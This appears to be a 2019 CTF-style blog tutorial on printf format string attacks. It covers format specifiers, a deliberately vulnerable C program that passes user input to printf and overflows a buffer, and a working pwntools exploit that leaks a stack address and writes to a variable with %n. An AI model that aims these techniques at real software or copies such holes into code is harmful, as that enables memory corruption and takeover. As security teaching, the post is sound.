<!--
.. title: 0x05 Format String Attack
.. slug: format-string-attack
.. date: 2019-04-19 00:00:00 UTC+02:00
.. tags: re, pwn, ctf, cpp
.. category: pwn
.. link: 
.. description: Description of this method, why this work, hot to calculate input length
.. type: text
-->

When trying to take control over the program, one must sometimes alter
information stored on the stack. StackOverflow is one possibility. It is
constrained by the order of variables placed on the stack. Format String Attack
allows overstepping this constraint. This kind of attack uses *printf*
functions family vulnerability. If one use *printf* with a variable instead of
the format string, you have your window of opportunity. Of course, if you are
the one who puts data to this variable.


<!-- TEASER_END -->

### What kind of string formaters can be used with printf family? 

What's usual case of *printf*?

```c
// example.c
#include "stdio.h"

int main() {
    int addr = 0x0806cd41;
    char buf[10] = "DEADBEEF";
    int wordCount;
    printf("Starting at address %#010x we search for %s.%n\n",
            addr, buf, &wordCount);
    printf("That message contains %2$d chars, and address %1$#010x.\n",
            addr, wordCount);
    return 0;
}
```
```sh
$ gcc -o example -g -static example.c
$ ./example
Starting at address 0x0806cd41 we search for DEADBEEF.
That message contains 54 chars, and address 0x0806cd41.
$ 
```
Here we can see 'basic' usage of this feature. I started with printing integer 
as hex number (```%x```) with leading '0x' (```%#```) and precision set to 10
characters with leading 0 (```%010```). If I want to omit '0x' I would probably
reduce precision to '08', because leaving '010' will print 3 leading 0s to fill
declared 10 chars ('000806cd41').

```%s``` will print string variable, it means that the second variable will be
interpreted as the address to an array of printable bytes. All printed characters
will be count and written to the third variable by ```%n```. This variable is an
integer passed by its address.

The second line is also interesting. Here we print saved length and our pseudo
address. Interesting is the fact that passed arguments aren't in the order they are used
in the format string. Here I specify which arg I want to use by ```%1$``` or
```%2$```.  

A full list of formaters you can find in ```man 3 printf```.

### How to use this knowledge

Les't take a buggy program:
```c
// buggy.c
#include "stdio.h"
#include "string.h"

void win() {
    printf("==============WIN===============\n");
    printf("         OK, you win!\n");
    printf("==============WIN===============\n");
}

int main() {
    char name[512];
    char msg[512];
    char task[512];
    int decision = 0;
    strcpy(msg, "Welcome %s!...\n");
    printf("Give me your name:\n");
    scanf("%s", name);
    printf(msg, name);
    printf("Now tell me what to do:\n");
    scanf("%s", task);
    printf("OK! I am on it.\n  -------ToDo-------\n");
    printf(task);
    printf("\n  -------ToDo-------\n");

    if(decision)
        win();
    return 0;
}
```
First, we want to print program output for the specially prepared string. What
is in this special string? First, we want to have simply recognizable bytes,
for example, "AAAABBBB". In little endian, it would be 42424242414141.
Yes, you should know about little/big endian. If not, you would have problems
with understanding what you see in gdb or program output. Next, we want to use
```%x``` to show what is on the stack. In this case, I have a 64-bit program so
I would use ```%lx``` format string to print all 8 bytes placed on the stack.

Printing value may be somewhat unclear, as the stack has different values 
every run. So for better alignment and, what is more important, to keep a steady
amount of chars printed on the screen (useful for the usage of %n) I use 
```%016lx``` - it prints 8 bytes hex values padded to full 16 characters. 
A few tries show me that my string lays deep into the stack.

This is what I've got:

```sh
$ python3 -c \
   "print('Bob\nAAAABBBB'+''.join([f'-{i+128}.%{i+128}\$016lx' for i in range(32)])+'\n')"\
   | ./buggy
Give me your name:
Welcome Bob!...
Now tell me what to do:
OK! I am on it.
  -------ToDo-------
AAAABBBB-128.0000000000000000-129.00007f64ff3a2170-130.00007f64ff3a2170-
131.00007f64ff191bb8-132.00007fff65a5aea0-133.00007f64ff17d4d7-134.0000000000000000-
135.0000000000000000-136.4242424241414141-137.3231252e3832312d-138.2d786c3631302438-
139.393231252e393231-140.312d786c36313024-141.24303331252e3033-142.33312d786c363130-
143.3024313331252e31-144.3233312d786c3631-145.313024323331252e-146.2e3333312d786c36-
147.3631302433333125-148.252e3433312d786c-149.6c36313024343331-150.31252e3533312d78-
151.786c363130243533-152.3331252e3633312d-153.2d786c3631302436-154.373331252e373331-
155.312d786c36313024-156.24383331252e3833-157.33312d786c363130-158.3024393331252e39-
159.3034312d786c3631
  -------ToDo-------
```
From program output, we can deduce that our string is a 136th argument on
the stack. Let's check this with unique "DEADBEEF" (4645454244454144):

```sh
$ ./buggy
Give me your name:
Bob
Welcome Bob!...
Now tell me what to do:
DAEDBEEF.%136$016lx
OK! I am on it.
  -------ToDo-------
DAEDBEEF.4645454244454144
  -------ToDo-------
```

Here I want to mention that there are few calling conventions 
[CCnv]. In this case, we have *System V ABI*, so arguments are passed by *rdi*,
*rsi*, *rdx* and *rsx*. And this is the reason why our string is so deep in the
stack. As the first argument, it is passed by *rdi* and isn't placed on the
stack by the function. So the 136th value on the stack is, in fact, original
variable *task*.

In CTF or other challenges, programs will be probably compiled with an optimal
configuration for planned vulnerability, but here I want to get some program
compiled on the standard system without special flags.  All this to get real
filling on the matter. Often I read something that seems easy but in the try,
something is missing or unspoken. And sometimes the problem lays in the
'special way of compilation'.

By default, **gcc** compile example *buggy* with some security techniques. This
knowledge will be very important for the next step - exploiting. 

```sh
$ checksec buggy
[*] './buggy'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

### The good part

In our case, this one vulnerability gives us a little. Every time a program can
be placed at a different memory location. So we cannot calculate proper
address and overwrite target variable in one run of *scanf*/*printf*.
Fortunately, there is another bug we can use. What's a coincidence.

What if one overflows *name* variable. 
```sh
$ python3 -c "print(512*'A'+'try this:%s\n')" | ./buggy
Give me your name:
tryNow tell me what to do:
OK! I am on it.
  -------ToDo-------
this:this:----ToDo-------
o do:

  -------ToDo-------
```
Hmm, one can do better.
```sh
$ python3 -c "print(512*'A'+'name_address:_%p_')" | ./buggy 
Give me your name:
name_address:_0x7fff163f0ad0_Now tell me what to do:
OK! I am on it.
  -------ToDo-------

  -------ToDo-------
```

So, we have an address of the *name* variable. From **gdb** we know the address
of *decision* variable. 

```
 ...
0x00000000000007e7 <+82>:  lea    rax,[rbp-0x610]  #name
0x00000000000007ee <+89>:  mov    rsi,rax
0x00000000000007f1 <+92>:  lea    rdi,[rip+0x18a]
0x00000000000007f8 <+99>:  mov    eax,0x0
0x00000000000007fd <+104>: call   0x640 <__isoc99_scanf@plt>
 ...
0x0000000000000873 <+222>: cmp    DWORD PTR [rbp-0x614],0x0
```

*decision* is 4 bytes above *name*. Exploit should extract *name* buffer
address subtract 4 bytes and make payload. Worth to remember, our address has 6
bytes.  It means that 2 higher bytes are the 00s. If we start our payload with
it, it would be a very short payload. So let's place it at the end:
```AAAAAAAA-%138$n<address>```. First 8 bytes as we know are at the 136th
place. So ```-%138$n``` will be the 137th and out address 138th - this is why
in the payload we have this value before ```n```.

So exploit which overwrites *decision* variable looks like this:
```python
from binascii import hexlify
from pwn import *

p = process('./buggy')
#gdb.attach(p)
print(p.readline())
name = 512*'A'+'__%p__'
p.sendline(name)
line = p.readline()
print(line)
address = line.split(b'__')[1]
print(f"address: {address}")
addr = int(address, 16)
addr -= 4
print(f"address of boolean: {hex(addr)}")
payload = b'AAAAAAAA-%138$n-' + p64(addr)
p.sendline(payload)
print(p.recv())
```

```sh
$ python3 buggy_exploit.py
[+] Starting program './buggy': Done
b'Give me your name:\n'
b'__0x7ffc26994b00__Now tell me what to do:\n'
address: b'0x7ffc26994b00'
address of boolean: 0x7ffc26994afc
b'OK! I am on it.\n  -------ToDo-------\nAAAAAAAA--\xfcJ\x99&\xfc\x7f\n  -------ToDo-------\n==============WIN===============\n         OK, you win!\n==============WIN===============\n'
[*] Program './buggy' stopped with exit code 0
```

It's not the end of this topic. What I've learned from this, but not expected to, 
is how good are default security mechanisms implemented in our compilators. How much
benefit they give us. I have to rewrite buggy example a few times, so I can later 
exploit it in this way. These security techniques do not fix programmers
mistakes but make exploiting them more difficult or impossible.

And I know, this example programs looks way too 80's. No one writes like that now.
But, should bad code looks pretty...

 

**...SQUEAK!**

&nbsp; 

### Bibliography:

- [EFSV] [Exploiting Format String Vulnerabilities (2001)](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)
- [CCnv] [Calling Conventions - Wikipedia article](https://en.wikipedia.org/wiki/X86_calling_conventions)
- [LBEn] [Endianness](https://en.wikipedia.org/wiki/Endianness)
